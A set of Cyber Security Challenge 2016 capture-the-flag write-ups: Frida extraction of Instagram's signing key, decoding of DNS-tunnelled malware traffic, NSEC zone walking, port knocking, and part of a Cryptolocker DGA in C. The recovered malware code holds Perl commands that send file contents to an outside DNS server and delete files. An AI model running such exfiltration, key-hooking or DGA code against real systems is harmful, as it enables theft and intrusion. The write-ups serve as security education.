![image2](images/image2.png)

- We can see the function getSignatureString(byte[]), which is implemented by a native library. Meanwhile, two native libraries are loaded by the same class, “scrambler” and “strings”. Disassembling the strings library (/lib/armeabi-v7a/libstrings.so) in Hopper tells us this is the library which implements this function (decompiled to pseudo code):

![image3](images/image3.png)

- The key for the signature algorithm (HMACSHA256) is fetched via the method Scrambler::getstring(). Decompiling this method reveals that the key is generated dynamically:

![image3](images/image3.png)

- We cannot simply copy paste it from here. However, we now know where the function that returns the signature key is located. All that is left is to hook this function’s return value upon calling, e.g. via the following Frida hooking code in python:

```python
import frida
import sys
 
session = frida.get_usb_device(1000000).attach("com.instagram.android")
script = session.create_script("""
fscrambler = Module.findExportByName(null,"_ZN9Scrambler9getStringESs");
Interceptor.attach(ptr(fscrambler), {
   onLeave: function (retval) {
​​send("key: " + Memory.readCString(retval));
   }
});
""")
 
def on_message(message, data):
   print(message)
   
script.on('message', on_message)
script.load()
sys.stdin.read()
```

- Starting the frida-server on the USB-attached mobile testing device, launching Instagram, executing the python script and triggering a calculation of a signature via e.g. a false login attempt spits out the key:

```
$ adb shell
shell@mako:/ $ su
root@mako:/ # /data/local/tmp/frida-server &                                  
[1] 3354
root@mako:/ # exit
shell@mako:/ $ exit
$ python hook.py
{u'type': u'send', u'payload': u'key: 4d53d9e2da15fd018e591939cd9689a8e7bbed50841fcb35b976ce63461cb834'}
```

## Solution
4d53d9e2da15fd018e591939cd9689a8e7bbed50841fcb35b976ce63461cb834

## Other write-ups and resources
- None yet.
# Cyber Security Challenge 2016: Insecure	

**Category:** Network security  
**Points:** 70  
**Challenge designer:** Adriaan Dens   
**Description:**  
> Our company "Dunking Nuke Sauces", which makes the best spicy sauces in the country, has recently lost the digital copy of my Old Grannys secret spicy sauce recipy. The IT department has informed me, the CEO of Dunking Nuke Sauces, that there might still be a chance to get recipy back!  
We found some data exfiltration malware on our systems, so the only thing we need to do is hack their communications and find our key back!  
I expect the key in 32 hours.  
Sir Edward Nuke, CEO of Dunking Nuke Sauces  
Dunk it or get nuked!  
Flag format: cscb{...}

>Hint: "These challenges are made for walking, and that's just what they'll do." ~ Nancy Sinatra

[Pcap file Here](challenge-source-files/insecure.pcap)

## Write-up
pening up the PCAP, we exclusively see DNS traffic. 

![Only DNS in the pcap](images/only_dns.png)

Between all these DNS queries, we see some calls to a domain called nuked.be.

![nuked.be. seems interesting](images/is_it_nuked.png)

In the screenshot, we see a query to some sort of registration, followed by some sort of bot command. This might be the malware of which Edward Nuke was talking about. 

Let us filter out those commands with a little scapy program.

```python
from scapy.all import *                                 
import re                                               
                                                        
pcap = PcapReader("insecure.pcap")                      
for packet in pcap:                                     
    if packet[DNS].ancount > 0:                         
        if re.search('nuked.be.', packet[DNSQR].qname): 
            for answer in packet[DNS].an:               
                print "Answer: %s" % answer.rdata       
    else: # Query                                       
        if re.search('nuked.be.', packet[DNSQR].qname): 
            print "Query: %s" % packet[DNSQR].qname
```

Looks like malware alright:
```
Query: nuked.be.
Query: nuked.be.
Query: nuked.be.
Answer: 54.172.156.249
Query: 3060547069917483.registration.nuked.be.
Query: 3060547069917483.registration.nuked.be.
Query: 3060547069917483.cmd.nuked.be.
Answer: 24633d22636d642e6e756b65642e62652e223b
Query: 3060547069917483.cmd.nuked.be.
Answer: 73756220707b7061636b2022482a222c706f707d
Query: 3060547069917483.cmd.nuked.be.
Answer: 73756220757b756e7061636b2022482a222c706f707d
Query: 3060547069917483.cmd.nuked.be.
Answer: 7375622073657b245f3d706f703b6024642b74726965733d3120245f2e24752e246324775c40247660666f726561636828756e7061636b2228413630292a222c245f297d
Query: 3060547069917483.cmd.nuked.be.
Answer: 73756220647b736520752022454e44222e24752e22454e44227d
Query: 3060547069917483.cmd.nuked.be.
Answer: 73756220637b7365207520706f707d
Query: 3060547069917483.cmd.nuked.be.
Answer: 73756220657b245f3d706f703b6d61707b6320245f7d73706c69742f5c6e2f3b26647d
Query: 3060547069917483.cmd.nuked.be.
Answer: 737562207a7b60247b647d66696c65732e247624775c402476607d
Query: 3060547069917483.cmd.nuked.be.
Answer: 65286066696e64202f202d747970652066202d6e616d6520227265636970792e74787422202d6578656320636174207b7d202b60293b
Query: 53656372657420496e6772656469656e742023313333373a20436c75622d.3060547069917483.cmd.nuked.be.
Query: 53656372657420496e6772656469656e742023313333373a20436c75622d.3060547069917483.cmd.nuked.be.
Query: 4d617465.3060547069917483.cmd.nuked.be.
Query: 4d617465.3060547069917483.cmd.nuked.be.
Query: 454e4433303630353437303639393137343833454e44.3060547069917483.cmd.nuked.be.
Answer: Stored in sikrit zone!
Query: 3060547069917483.cmd.nuked.be.
Answer: 65286066696e64202f202d747970652066202d6e616d6520227265636970792e74787422202d6578656320726d207b7d202b60293b
Query: 454e4433303630353437303639393137343833454e44.3060547069917483.cmd.nuked.be.
Answer: Stored in sikrit zone!
Query: 3060547069917483.cmd.nuked.be.
Answer: 6528606563686f2022596f7520676f74206e756b656422203e207e2f6e756b65642e74787460293b
...
```

We thus see some kind of registration and then using that registration number, it calls for commands.

With a good eye, you will notice that all answers and some parts of the query are in hexadecimal. Let us decode those answers.

```python
from scapy.all import *
from binascii import unhexlify
import re

pcap = PcapReader("insecure.pcap")
for packet in pcap:
    if packet[DNS].ancount > 0:
        if re.search('nuked.be.', packet[DNSQR].qname):
            for answer in packet[DNS].an:
                raw_data = answer.rdata
                try: # Crashes on IP addr
                    raw_data = unhexlify(raw_data)
                except TypeError:
                    pass
                print "Answer: %s" % raw_data
    else: # Query
        query = packet[DNSQR].qname
        if re.search('nuked.be.', query):
            prefix_match = re.match('([a-fA-F0-9]+)\.(\d+)\.cmd\.nuked\.be\.', query)
            if prefix_match:
                print "Query: %s.%s.nuked.be." % (unhexlify(prefix_match.group(1)), prefix_match.group(2))
            else:
                print "Query: %s" % query
```

```
Query: nuked.be.
Query: nuked.be.
Query: nuked.be.
Answer: 54.172.156.249
Query: 3060547069917483.registration.nuked.be.
Query: 3060547069917483.registration.nuked.be.
Query: 3060547069917483.cmd.nuked.be.
Answer: $c="cmd.nuked.be.";
Query: 3060547069917483.cmd.nuked.be.
Answer: sub p{pack "H*",pop}
Query: 3060547069917483.cmd.nuked.be.
Answer: sub u{unpack "H*",pop}
Query: 3060547069917483.cmd.nuked.be.
Answer: sub se{$_=pop;`$d+tries=1 $_.$u.$c$w\@$v`foreach(unpack"(A60)*",$_)}
Query: 3060547069917483.cmd.nuked.be.
Answer: sub d{se u "END".$u."END"}
Query: 3060547069917483.cmd.nuked.be.
Answer: sub c{se u pop}
Query: 3060547069917483.cmd.nuked.be.
Answer: sub e{$_=pop;map{c $_}split/\n/;&d}
Query: 3060547069917483.cmd.nuked.be.
Answer: sub z{`${d}files.$v$w\@$v`}
Query: 3060547069917483.cmd.nuked.be.
Answer: e(`find / -type f -name "recipy.txt" -exec cat {} +`);
Query: Secret Ingredient #1337: Club-.3060547069917483.nuked.be.
Query: Secret Ingredient #1337: Club-.3060547069917483.nuked.be.
Query: Mate.3060547069917483.nuked.be.
Query: Mate.3060547069917483.nuked.be.
Query: END3060547069917483END.3060547069917483.nuked.be.
Answer: Stored in sikrit zone!
Query: 3060547069917483.cmd.nuked.be.
Answer: e(`find / -type f -name "recipy.txt" -exec rm {} +`);
Query: END3060547069917483END.3060547069917483.nuked.be.
Answer: Stored in sikrit zone!
Query: 3060547069917483.cmd.nuked.be.
Answer: e(`echo "You got nuked" > ~/nuked.txt`);
Query: END3060547069917483END.3060547069917483.nuked.be.
Answer: Stored in sikrit zone!
Query: 3060547069917483.cmd.nuked.be.
Answer: sub p{pack "H*",pop}
Query: nuked.be.
...
```

Our assumption about the registration and the commands seem correct. We see the command and control sending back some Perl code looking for "recipy.txt" files and a command deleting those files.

Interesting to note as well is that the output seems to be stored in a secret DNS zone.

Let us list the commands send over the wire:
```perl
$c="cmd.nuked.be.";
sub p{pack "H*",pop}
sub u{unpack "H*",pop}
sub se{$_=pop;`$d+tries=1 $_.$u.$c$w\@$v`foreach(unpack"(A60)*",$_)}
sub d{se u "END".$u."END"}
sub c{se u pop}
sub e{$_=pop;map{c $_}split/\n/;&d}
sub z{`${d}files.$v$w\@$v`}
e(`find / -type f -name "recipy.txt" -exec cat {} +`);
e(`find / -type f -name "recipy.txt" -exec rm {} +`);
e(`echo "You got nuked" > ~/nuked.txt`);
```

Making the code a bit more understandable, we get:
```perl
$c="cmd.nuked.be.";
sub unhexxie {
    my $hex_str = pop;
    my $str = pack("H*",$hex_str);
    return $str;
}
sub hexxie {
    my $str = pop;
    my $hex_str = unpack("H*", $str);
    return $str;
}
sub send_output {
    my $output = pop;
    # Splits a string into chunks of 60 chars
    foreach my $chunk (unpack"(A60)*", $output) {
        `$d+tries=1 $chunk.$u.$c$w\@$v`
    }
}
sub delimiter {
    my $hex_str = hexxie("END" . $u . "END");
    send_output($hex_str);
}
sub prep_and_send {
    my $str = pop;
    my $hex_str = hexxie($str);
    send_output($hex_str);
}
sub execute {
    my $output = pop;
    foreach my $line (split /\n/, $output) {
        prep_and_send($line);
    }
    delimiter();
}
sub something {
    `${d}files.$v$w\@$v`
}
execute(`find / -type f -name "recipy.txt" -exec cat {} +`);
execute(`find / -type f -name "recipy.txt" -exec rm {} +`);
execute(`echo "You got nuked" > ~/nuked.txt`);
```

Seems like the malware will evaluate the commands send from the DNS server.
However, we still need to figure out what those backtick commands are:
```perl
`$d+tries=1 $_.$u.$c$w\@$v`
`${d}files.$v$w\@$v`
```

We can fill in `$c`:
```perl
`$d+tries=1 $_.$u.cmd.nuked.be.$w\@$v`
`${d}files.$v$w\@$v`
```

Knowing that the malware works over DNS and having a very 'dig' looking command, we can make the assumption that `$d` is 'dig ':
```perl
`dig +tries=1 $_.$u.cmd.nuked.be.$w\@$v`
`dig files.$v$w\@$v`
```

From the pcap, we know the bot ID is always given in each command, so `$u` is probably the user:
```perl
`dig +tries=1 $_.3060547069917483.cmd.nuked.be.$w\@$v`
`dig files.$v$w\@$v`
```

We also notice that the malware always talks directly with the server itself, instead of using the DNS server of the (home) subnet. This can be done with the "@x.x.x.x" in 'dig'.
```perl
`dig +tries=1 $_.3060547069917483.cmd.nuked.be.$w @54.172.156.249`
`dig files.$v$w @54.172.156.249`
```

Almost there. The 'dig' command also allows one to define the Resource record type by just defining it after the query. Seems like a good fit for `$w`:
```perl
`dig +tries=1 $_.3060547069917483.cmd.nuked.be. TXT @54.172.156.249`
`dig files.$v TXT @54.172.156.249`
```

Given that we query the specific DNS server and recursive lookups are disabled, we know that the `$v` must be a zone on the DNS server. Although nothing prohibites running other zones besides 'nuked.be.' and child zones, we can at least try to see if 'files.nuked.be.' exists:

```
$ dig files.nuked.be. SOA 

; <<>> DiG 9.9.5-3ubuntu0.7-Ubuntu <<>> files.nuked.be. SOA
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24812
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;files.nuked.be.			IN	SOA

;; ANSWER SECTION:
files.nuked.be.		47	IN	SOA	ns.files.nuked.be. hostmaster.files.nuked.be. 2016021801 300 300 300 300

;; Query time: 6 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Tue Mar 08 11:04:01 EST 2016
;; MSG SIZE  rcvd: 93
```

Success!


At this point, some knowledge about DNS and DNSSEC is expected. Basically, the question we are asking ourselves is "Can we see all files, ever, uploaded on that zone?".

And the answer is: "Yes, of course!".

Let us try AXFR:
```
$ dig files.nuked.be. AXFR

; <<>> DiG 9.8.3-P1 <<>> files.nuked.be. AXFR
;; global options: +cmd
; Transfer failed.
```

Does not seem to work. Another technique is (NSEC) zone walking, which can be done when DNSSEC is enabled.
```
$ dig files.nuked.be. SOA +dnssec

; <<>> DiG 9.9.5-3ubuntu0.7-Ubuntu <<>> files.nuked.be. SOA +dnssec
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36224
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags: do; udp: 512
;; QUESTION SECTION:
;files.nuked.be.			IN	SOA

;; ANSWER SECTION:
files.nuked.be.		299	IN	SOA	ns.files.nuked.be. hostmaster.files.nuked.be. 2016021801 300 300 300 300
files.nuked.be.		299	IN	RRSIG	SOA 10 3 300 20160319170447 20160218170447 30851 files.nuked.be. A53ISoousihQvopuXlYexx3I0nwwjNiW9Us905qr5wKQX/GOQUxTou1x hm6RCLWLjqFjMSmrdi91Y26i/aQdtcedc8jk33DEJyWZuu17/CuYehFX MUIedWmxo+/0xrh1YsBpqQ/K2M/nnTJUFGNiSt3vL3nbTSoxLuC+iATt Vshj6taZAo0jWT0QvK7lw6+TMEdrKhvlk8k5JlNGwWWmOLHJBDaHxa2i nEb+vMzuW32jpVW1klITrX+zbkqDfwzYVOfN7NzNBpBj+kNplJIaiaX0 yZjr4dELrKemd7JkX1g/hF/nrEe+W16KItW7eEbLjROfUQiu5qctFYvI jHdD5g==

;; Query time: 124 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Tue Mar 08 11:04:48 EST 2016
;; MSG SIZE  rcvd: 395
```

Alright! Let us run an nsec walker on this zone.

```
$ ./ldns-walk -4 -f @ns.files.nuked.be files.nuked.be. | tee -a walking_zone.txt
files.nuked.be. 300 IN  NS  nsbackup.files.nuked.be.
files.nuked.be. 300 IN  NS  ns.files.nuked.be.
files.nuked.be. 300 IN  RRSIG   NS 10 3 300 20160306084328 20160205084328 30851 files.nuked.be. CBJfi78pvBnthsl7OQnHKFYefsMTKuswxDiZ2NA2wKMnXsbc1y1ZYxQMGoCEqWBEhL4/XV7shKsYR6q/IJ0Bb2BZn6Ob6qW+HDP6Lkye0W09y86+7GD/WTEBc2TcSTl9h1ilZYhJtxtfGph5rMJz8XdNdOv5ohmUIrxV9lRyI2FvnukRkZDPDjTyBnWMhYhmkeNAY0EFAEbIR4X5wQYMehcmXwWOiIpxEiyZ00TwzfR8EBMLbrpl4FlpINKWgPCNHRMA5suVYECoGaxKz/i8F2Tk8nGVlOkg5LMKtojoxyKB5XHqXmHfJ+7Iz7D8XX6xEub690YyhFyGPYuOEznA1A==
files.nuked.be. 300 IN  SOA ns.files.nuked.be. hostmaster.files.nuked.be. 2016012307 300 300 300 300
files.nuked.be. 300 IN  RRSIG   SOA 10 3 300 20160306084328 20160205084328 30851 files.nuked.be. G3TvLaVj2Fjkot8EE+KsUkcuzEo/NfeKUHLkEJ8hoHeWuLMBbwMXQA6CgTzdDkT0I7WFNg21mckm2J4l8Q6fgH2Bph5mBdPdAVj/Lxi6wcddxFiqTIAgactlXe8mCGzfc9kSKSUVA/BVQKi9yXuL9NlNaA+/B2Oro1yZ21TJM6C2ljqvT4nn6ob7xB/eDP19jYqqjExj7uoGnBwxpvKQFPChFle1uvyWsTfjvukAIW/KMsVyTqykDBTO69sxENKLwi/RDCDZxpn4Hllqx3AAMMHHAV4jgEKNp4ZI/ycQBtlW//NkbQVPc5JxJVDACNuv22G1SHu82XaE6n+Vyw04ig==
files.nuked.be. 300 IN  TXT "2824742c24762c24772c24642c24752c2463293d28272f746d702f6e756b3364272c276e756b65642e62652e272c272054585420272c27646967202b73686f727420272c302c30293b" "6966282d652474297b6f70656e20542c223c2474223b24753d3c543e7d656c73657b" "4b3a24753d696e742872616e64283130292a2831302a2a313529293b676f746f204b20696660246424752e726567697374726174696f6e2e24762477603b" "6f70656e20542c223e2474223b7072696e7420542024757d" "4c3a245f3d60246424752e636d642e247624775c402476603b732f5c227c5c6e2f2f673b" "24783d7061636b27482a273b6576616c24783b736c6565702031303b676f746f204c"
files.nuked.be. 300 IN  RRSIG   TXT 10 3 300 20160306084328 20160205084328 30851 files.nuked.be. k6lZPzuwBqmpam3ZTbRoZAYbFSXn3jVBxJQOBCgFP/N67rKEnv/8f1LKvrs9bdxMm6ZtwbX4B6+9JEuxYZE8iNQVBXzCt1fGSszwlBDy5sW6lv/K3Nn4hIc7eahAehqbB/39L0gVly22aHqEFG7FDRnEwaQfjD7EWNBaZ1CMUEq8PQjCrfmRMJe4d8t3f4Y+VhzSpKd/nxTeiZL5B4LuakO27htM878POx+jfylh/9ZTqCm0DWw3RLV2SxAV8x/kCPrM0lvJV739xFtWvAV/F5vaZ9i/7TQvjdCwpg1V+wOSjw8HCuww0CkwOMieM9Z8Gm4rB3gjkxorZdNMVSL/SA==
files.nuked.be. 300 IN  DNSKEY  256 3 10 AwEAAat6lMm8TvGMTbsqzQ/X5PtO6s320qqBcpIrjanqzKtvt3CELCuArT9gfUts1SMQqXwgEynPyzaP0MjVuQm1YKPIQOcMYGWo+gs4fFPWmCVFHiLvNSLvnJRxtWyJNJa+gYV8ljP6CzdZyYGNOeoJ29dhVMAfyGnTUTXiS4cG8hFf25iEw5euswNYaTfmD8Xs2IH28TLO1adOtJFJNQxTHTEbeqtH7PBlEEy0KXZ5PttXtzgOLgIUBHuEJiBrTWlFewNDKXQqFmak9CMlH+VQ9+CiKvO3GBhJJQ8BFcrm9nyrVjdpJ6Fr/J57ayy/rgl49Vm3+oDHZdSDlNPT7/q0JEs= ;{id = 30851 (zsk), size = 2048b}
...
```

And of course, we get a lot of output. Notice the use of the 'f' option to get the full resource records dumped.

Filtering on TXT records (we are actually not interested in all other RRs):
```
$ cat walking_zone.txt | perl -ne 'print if m#.files.nuked.be.\t300\tIN\tTXT#'
01ee2947261fcbde4b8bbce2b2a0fcdc.files.nuked.be.    300 IN  TXT "4772616e6e792051756f74652023313233373a20542765732070617320656e20636c617373652076657274652c20746f693f"
09daea219e57845a7f2fbae938416a70.files.nuked.be.    300 IN  TXT "5365637265742048696e742023343532323a204561742e20536c6565702e204861636b2e205265706561742e"
10dd6c30cedded46c3e2182b8a34350f.files.nuked.be.    300 IN  TXT "4772616e6e792051756f74652023323235343a20596f206d616d6120736f206661742c207368652061746520612077686f6c652050697a7a612e2e2e2e4875742e"
12577f2c24a8d4c30356106a9abef44f.files.nuked.be.    300 IN  TXT "4772616e6e792051756f74652023353839353a204920726561642053686f6b7567656b69206e6f20536f756d61206265666f726520796f75207765726520626f726e"
12cabc9a7f7f9bf840b40254003a29a3.files.nuked.be.    300 IN  TXT "4772616e6e792051756f74652023333539373a206e79616e206e79616e206e79616e206e79616e"
157bea37e1e2655a7475d435a2bc4043.files.nuked.be.    300 IN  TXT "4772616e6e792051756f74652023323435313a20416d61646575732073746f6c65206d7920737061726520726962732072656369707921"
1b57c06fcbbabc12aac75f7dbced7b71.files.nuked.be.    300 IN  TXT "4772616e6e792051756f74652023323334323a20596f206d616d6120736f206661742c207368652063757276657320737061636520616e642074696d652e"
24e0f37c07c15b1a2ab9c28dc806ebed.files.nuked.be.    300 IN  TXT "4772616e6e792051756f74652023363738363a20596f206d616d6120736f206661742c2068657220626c6f6f642074797065206973204e7574656c6c612e"
34aefcd28c3deff10a108bdfe45ba913.files.nuked.be.    300 IN  TXT "4772616e6e792051756f74652023323334353a20416c6d6120494949206973206265737420416c6d612e"
3bf3f94cf934d1cea96042a215f1a7c6.files.nuked.be.    300 IN  TXT "4772616e6e792051756f74652023393038363a205768656e20492077617320796f756e6765722c20776520616c6c206a75737420776f726b656420686172642e"
...
```

Looks like we got some records stored in hexadecimal notation. Decoding all records:
```
$ cat walking_zone.txt | perl -ne 'print if m#.files.nuked.be.\t300\tIN\tTXT#' | perl -nale '$_=$F[4];s/\"//g;print pack"H*",$_' 
Granny Quote #1237: T'es pas en classe verte, toi?
Secret Hint #4522: Eat. Sleep. Hack. Repeat.
Granny Quote #2254: Yo mama so fat, she ate a whole Pizza....Hut.
Granny Quote #5895: I read Shokugeki no Souma before you were born
Granny Quote #3597: nyan nyan nyan nyan
Granny Quote #2451: Amadeus stole my spare ribs recipy!
Granny Quote #2342: Yo mama so fat, she curves space and time.
Granny Quote #6786: Yo mama so fat, her blood type is Nutella.
Granny Quote #2345: Alma III is best Alma.
Granny Quote #9086: When I was younger, we all just worked hard.
Granny Quote #6044: I like my coffee, like I like my men. Black.
Secret Hint #7209: Add vodka for an extra punch
Granny Quote #3743: I firmly believe in the three second rule.
Granny Quote #4869: I ate mitraillettes before you were born, son!
Secret Hint #0488: Pluck tomatoes when red
Granny Quote #7999: Like I'll write my old recipes done?!
Granny Quote #5805: Yo mama so fat, she gave dracula diabeties
Granny Quote #8256: Eh Omar, la sauce, a part ou sur les frites?
Granny Quote #5634: Yo mama so fat, she blocks the WiFi signal.
Granny Quote #3337: Matt Stonie is my kind of guy
Granny Quote #2908: I prefer Burger King over McDo
Granny Hint #4674: Study at Tootsuki Academy if you want a future
Secret Ingredient #2062: Chocolate flakes
Granny Quote #1893: Samurai sauce is best sauce.
Granny Quote #8956: Quel klet ce pe
Secret Hint #4744: I always cook with Eddy Wally music!
Granny Quote #5896: Megumi is best girl.
Secret Hint #9666: Cook chicory together with meat balls for more flavor
Granny Quote #5755: Meat balls are a prime source of food
Granny Quote #5674: Hmmmmmmmm Donutssssssss
Granny Quote #7902: Ou tu sors, ou je te sors
Granny Quote #0234: I prefer Quick over McDo
Secret Ingredient #7587: Cocaine
Granny Recipe book: https://goo.gl/sIsd9u
Secret Hint #5698: Whenever in doubt, add more salt
Granny Quote #7623: Sais-pas moi, sauce Dallas
Granny Quote #8907: Yo mama so fat, she's got her own area code!
Secret Hint #5777: Reuse bacon grease for the next cooking!
Granny Quote #7485: I like guys with a big.... appetite.
Granny Quote #1233: Steak frites is life.
Secret Ingredient #1337: Club-Mate
Granny Quote #4843: Pour moi un grand paquet frites avec sauce svp
```
What is this Granny Recipe book at https://goo.gl/sIsd9u?

![Flag found](images/flag_found.png)

##Solution
cscb{DNSSEC_is_iNSECure_m'kay}

## Other write-ups and resources
# Cyber Security Challenge 2016: The Smokescreen Challenge

**Category:** Network Security  
**Points:** 70  
**Challenge designer:** Jérôme Devigne  
**Description:**
> Start here: 52.17.52.40 . Don't aim too high.
> 
> Hints: 
>* “sometimes size DOES matter”
>* “knock knock! Who’s there?”
>* “diabolus in musica”


## Write-up
The challenge is centred on a server that has a bit of “security by obscurity” in place which will render traditional approach difficult if not even impossible. 

To get access to the server itself where the solution flag is stored, the exposure is very limited and it will be required to use a technique 
called ‘port knocking’ in order to remove the “smokescreen” and open an SSH access. In order to do this, there is a riddle to solve where instructions on what to do is literally hidden in plain sight. The final elements require some music theory knowledge in order to find the actual sequence.

####1) Initial discovery

Starting point is only an IP. Scanning for most used port will not reveal anything as only port TCP 440 is opened. A more thorough scan is required. Additionally, the open port will not show banners indicating a known service as it’s announcing “Mohawk net deliverer”.

-  TCP 440: port number itself is actually an hint to make the link with music theory topic as it’s the pitch frequency of the note A4 in hertz; which is also a common reference used for tuning musical instruments 
-  “Mohawk net deliverer” is an intended pun, the service being in reality an ‘apache web server’ (Mohawk is another Amerindian tribe (as apache), Net and web are more or less synonims, Deliverer is a non-existing English word that mimics server (to deliver and to serve being rather similar)

####2) The riddle

Visiting the website (on port TCP 440) with a web browser will reveal a very simple html page that looks like a private message left to Erik (one of the challenge organisers). The message proposes a songs playlist to be listened to during the challenge and is literally indicating what to do (see below).

- By observing the page under more scrutiny (by simple observation if you have really good eyes or looking at the source code for example), some words from the songs titles are actually written slightly bigger than the rest. This is true for all songs except one which is a bit more special (see next section).

Isolating these words gives: “Knockin stateless port order frequency first 8 sound 17 seconds devil music”. 
This actually tells to ‘knock (knockin) UDP (stateless) ports (port); the sequence (order) being the note (sound) frequency (frequency) of the first (first) 8 (8) notes from the ‘17 seconds devil music’.

To get access, challengers will need to set up a knock client and find a certain sequence of eight notes. The ’17 seconds devil music’ part refers to the only song that has not been used so far (which is mentioned in the text as being ‘specially selected’), a bit of googling (or knowledge) can reveal the
following:

- The song “Purple Haze” from Jimi Hendrix is known to be containing a specific music structure present in the first 17 seconds of the song (then repeated later in the song). This musical structure is  known as “diabolus in musica” which is a sequence of 2 notes with a frequency interval of exactly 3 tones; this structure was explicitly forbidden by the catholic church for centuries as it’s believed to be calling the devil and opening the doors of hell… 

####3) Parameters required

As stated above, the key is actually the 8 first notes from the first 17 seconds of the song Purple Haze from Jimi Hendrix. By looking for any guitar tab (partition) on the internet, the songs starts with 4 repetitions of 2 notes: Bm3 and Bm4 which have respectively a frequency of (in hertz, rounded): 233 Hz and 466 Hz.

- The sequence is (all in UDP, stateless): 233, 466, 233, 466, 233, 466, 233, 466

####4) Extra step of annoyance

Once using a correctly set up knock client (multiple implementation exist) with the above mentioned sequence, the server reveals an extra open port (TCP 666) where a SSH daemon is running.

- Hint: the playlist page refers to ‘while the kids are in hell’; open port is 666 is a reference to the “number of the beast” which is associated in biblical references to hell
- If the hint is not understood… an new complete TCP scan will reveal it.

But it’s not over yet… because there is only one user that has access to the server through SSH… The last sentence of the playlist page literally gives out the solution: `“this guy will unlock the full potential of u brain”`

- “this guy will unlock” = password is: ‘jimi hendrix’

- u brain = spelling mistake is voluntary and indicates user (u) is ‘brain’

####5) The loot

Finally, once connecting with a SSH client to the server on port 666 with the right credentials, challengers will get a message saying:

`Good job, the flag is "I_can_see_clearly_now_the_smokescreen_is_gone"`

## Solution
I\_can\_see\_clearly\_now\_the\_smokescreen\_is\_gone
## Other write-ups and resources
- None yet.
# Cyber Security Challenge 2016: Bxlb0yz

**Category:** OSINT  
**Points:** 100  
**Challenge designer:** Adriaan Dens  
**Description:**  
> There seems to be a new gang of youngsters in BXL city, selling pharmaceuticals and designer drugs. Being a young hipster gang, not a moment goes by without them checking their smartphone and updating their online profiles.  Sadly, as an old police officer, I cannot follow their every move on all these social things online. So I need you to go online and crack the case for me. There are donuts at the end!

>Hint: 32-bit

##Write-up

Note: The tweets you see in this writeup will probably be different as the feed remains active until just before the challenge. We also tried to keep a low profile in the months before the competition, such that the Twitter account would not be found. As such, the number of likes, followers etc. will be higher when you solved it as to when this write-up was written.


### Finding the Twitter account

The first step was to find the Twitter account. As a small hint, we gave away that they were active on social media. Using the Twitter search function yields the account:

![Finding the Twitter account](images/searching_for_bxlb0yz.png)

Of course, Google also lists this Twitter account when searching for "bxlb0yz".

As we take a look at the Twitter account that we found, we notice the strange use of hashtags:

![What is this hashtag you are talking about?](images/bxlb0yz_tweets.png)


### Finding the logic behind the hashtag

Of course, somewhere is a clue hidden about the logic behind those hashtags. There are a few candidates. We can take a look at the pictures in the tweets, we can search for interesting people that the account follows and we can look at the likes given by the account.

With some searching, you would find that a hint was given in the likes. There are a number of likes that talk about DGAs (Domain Generated Algorithms) and some that talk about Cryptolocker, which uses DGAs.

![bxlb0yz likes some interesting tweets.](images/bxlb0yz_likes.png)

The most interesting tweet is from Alexandre Dulaunoy:

![Hint about the DGA used by the bxlb0yz](images/bxlb0yz_DGA.png)

### Writing an implementation of the DGA

Using the link provided (http://blog.fortinet.com/post/a-closer-look-at-cryptolocker-s-dga), we implement the DGA:

```c
#include<stdio.h>
#include<stdlib.h>
#include<inttypes.h>

uint32_t generate_key(uint32_t);
char* generate_hashtag(uint32_t, uint32_t, uint32_t, uint32_t);

int main() {
	uint32_t initial_seed = 0;
	uint32_t key = generate_key(initial_seed);
	uint32_t year = 2016;
    for(uint32_t month = 1; month < 4; month++) {
        for(uint32_t day = 1; day < 32; day++) {
            char* hashtag = generate_hashtag(key, day, month, year);
            printf("%" PRIu32 "/%" PRIu32 "/2016: #%s\n", day, month, hashtag);
            free(hashtag);
        }
    }
	return 0;
}

char* generate_hashtag(uint32_t key, uint32_t day, uint32_t month, uint32_t year) {
    /* Generating new_key */
    uint32_t new_key = (((key * 0x10624DD3) >> 6) * 0xFFFFFC18) + key;

    /* Current day */
    uint32_t day_key = (day << 0x10) ^ day;
    if(day_key <= 1) {
        day_key = day << 0x18;
    }

    /* Current month */
    uint32_t month_key = (month << 0x10) ^ month;
    if(month_key <= 7) {
        month_key = month << 0x18;
        if(month_key <= 7) {
            month_key = ~month_key;
        }
    }

    /* Current year */
    uint32_t year_key = ((year + new_key) << 0x10) ^ (year + new_key);
    if(year_key <= 0xF) {
        year_key = ((year + new_key) << 0x18);
    }

    /* String length */
    uint32_t string_length = (((day_key ^ ((year_key ^ 8 * year_key ^ ((day_key ^ ((month_key ^ 4 * month_key) >> 6)) >> 8)) >> 5)) >> 6) & 3) + 0xC;

    /* Generating the name */
    uint32_t index = 0;
    char* servername = calloc(string_length+1, sizeof(char));
    servername[string_length] = '\x00';
    do {
        day_key = (day_key >> 0x13) ^ ((day_key >> 6) ^ (day_key << 0xC)) & 0x1FFF ^ (day_key << 0xC);
        month_key = ((month_key ^ 4 * month_key) >> 0x19) ^ 0x10 * (month_key & 0xFFFFFFF8);
        year_key = ((year_key ^ 8 * year_key) >> 0xB) ^((year_key & 0xFFFFFFF0) << 0x11);
        index++;
        servername[index-1] = (day_key ^ month_key ^ year_key) % 0x19 + 'a';
    } while(index < string_length);

    return servername;
}

uint32_t generate_key(uint32_t seed) {
    /* Stage 2: Generating the array of seeds */
    uint32_t seed_array[624];
    seed_array[0] = seed;
    for(int i = 1; i < 624; i++) {
        uint32_t previous_seed = seed_array[i - 1];
        uint32_t current_seed = (((previous_seed >> 0x1E) ^ previous_seed) * 0x6c078965) + i;
        seed_array[i] = current_seed;
    }
    
    /* Stage 3: Processing the array of seeds */
    int i = 0;
    while(i < 0xE3) {
        uint32_t seed_a = seed_array[i];
        uint32_t seed_b = seed_array[i + 1];
        uint32_t temp_a = (seed_a ^ seed_b) & 0x7FFFFFFF;
        i++;
        temp_a = (temp_a ^ seed_a) & 1;
        uint32_t consta[] = {0, 0x9908B0DF};
